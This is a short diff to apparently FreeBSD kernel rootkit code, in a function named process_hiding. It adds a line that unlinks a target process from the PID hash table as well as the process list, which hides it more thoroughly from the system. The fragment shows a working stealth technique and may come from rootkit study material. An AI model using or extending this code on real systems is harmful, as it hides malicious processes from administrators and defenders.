@@ -48,6 +48,7 @@ static int process_hiding(struct thread *td, void *syscall_args) {
 		if (strncmp(p->p_comm, target, MAXCOMLEN) == 0) {
 			uprintf("hiding process '%s' at %p\n", p->p_comm, p);
 			LIST_REMOVE(p, p_list);
+			LIST_REMOVE(p, p_hash);
 		}
 
 		PROC_UNLOCK(p);
